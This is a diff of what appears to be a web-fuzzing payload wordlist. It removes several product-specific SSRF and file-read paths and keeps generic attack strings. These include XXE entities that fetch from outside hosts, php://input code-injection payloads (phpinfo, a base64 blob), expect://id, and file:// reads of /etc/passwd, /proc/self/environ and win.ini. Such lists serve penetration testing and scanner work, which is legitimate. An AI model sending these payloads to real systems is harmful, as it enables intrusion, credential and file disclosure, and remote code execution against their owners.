@@ -114,11 +114,8 @@
 <xml version="1.0"?><!doctype xxe [<!element methodname any ><!entity xxe system "http://xerosecurity.com/.testing/rfi_vuln.txt">]><methodcall><methodname>&xxe</methodname></methodcall>
 <xml version="1.0"?><!doctype xxe [<!element methodname any ><!entity xxe system "https://crowdshield.com/.testing/rfi_vuln.txt">]><methodcall><methodname>&xxe</methodname></methodcall>
 ?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input http/1.1
-api/geojson?url=file:///etc/passwd
-cart/extras/curltest.php?url=file:///hostmarker:portmaker/passwd
 concat:http://yngwie.ru/header.m3u8|file:///etc/passwd
 expect://id
-extras/curltest.php?url=file:///hostmarker:portmaker/passwd
 file:///
 file:///c:/windows/win.ini
 file:///etc/group
@@ -131,17 +128,9 @@ file:///etc/sysconfig/network
 file:///proc/self/environ
 file:///proc/version
 file:///var/www/html/.htaccess
-filter/jmol/js/jsmol/php/jsmol.php?call=getrawdatafromdatabase&query=file:///etc/passwd
-getcorsfile?urlpath=file:///c://windows/win.ini
-getcorsfile?urlpath=file:///etc/passwd
 php://input
 php://input%00 -c '<?php echo "pwned"; ?>'
 php://input%00 -c '<?php phpinfo(); ?>'
 php://input;base64,smjhdhk4y1dibfjhemh6q3lqqtw%2fcghwigvjag8gj1z1bg5lcmfibgunoya%2fpkpiyxr5ognxsgxsyxpoekn5ake%3d
 php://input;base64,smjhdhk4y1dibfjhemh6q3lqqtw%2fcghwigvjag8gj1z1bg5lcmfibgunoya%2fpkpiyxr5ognxsgxsyxpoekn5ake=
-portal/attachment_downloadbyurlatt.action?filepath=file:///etc/passwd
-reports/rwservlet?report=test.rdf&desformat=html&destype=cache&jobtype=rwurl&urlparameter=file:///
-ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///etc/shells
-wp-content/themes/diarise/download.php?calendar=file:///etc/passwd
 xhtml entity hijacking [<!entity nbsp "'">]  by @masa141421356
-zxrjl3noywrvdyuwma==php://input
